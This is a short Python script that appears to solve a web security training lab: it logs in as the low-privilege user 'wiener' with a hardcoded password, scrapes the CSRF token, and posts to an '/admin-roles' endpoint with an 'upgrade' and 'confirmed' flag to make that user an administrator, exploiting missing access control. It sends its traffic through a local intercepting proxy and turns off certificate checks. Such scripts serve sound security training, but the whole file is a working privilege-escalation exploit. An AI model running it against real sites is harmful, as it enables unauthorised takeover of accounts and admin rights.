#!/usr/bin/env python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False

def upgrade_user(s, url):
    upgrade_url = url + "/admin-roles"
    data = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
    s.post(upgrade_url, data=data, verify=False, proxies=proxies, allow_redirects=True)
    r = s.get(url, verify=False, proxies=proxies)
    if "Congratulations" in r.text:
        print("[+] Successfully upgraded user wiener")
    else:
        print("[-] Error. Failed to upgrade user wiener")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    upgrade_user(s, url)

if __name__ == "__main__":
    main()